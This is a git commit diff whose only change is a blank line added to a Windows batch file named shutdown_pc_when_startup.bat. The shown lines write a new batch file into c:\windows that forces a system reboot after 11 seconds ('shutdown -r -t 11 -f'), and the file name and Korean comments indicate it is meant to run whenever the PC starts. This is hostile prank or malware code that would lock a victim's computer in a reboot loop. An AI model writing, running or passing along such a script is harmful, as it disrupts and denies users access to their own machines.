b58725ca4a641742c925cfe0dd30755a38071923
seyeong jo <s.y.jo665@gmail.com>
2024-10-07 13:49:32 +0900

    코드 재정렬

--- shutdown_pc_when_startup.bat
+++ shutdown_pc_when_startup.bat
@@ -2,6 +2,7 @@
 :: .bat 파일 생성 및 명령 추가
 echo @echo off > c:\windows\hartlell.bat
 echo @break off >> c:\windows\hartlell.bat
+
 :: 11초 후에 강제로 시스템을 재부팅
 echo shutdown -r -t 11 -f >> c:\windows\hartlell.bat
 echo end >> c:\windows\hartlell.bat
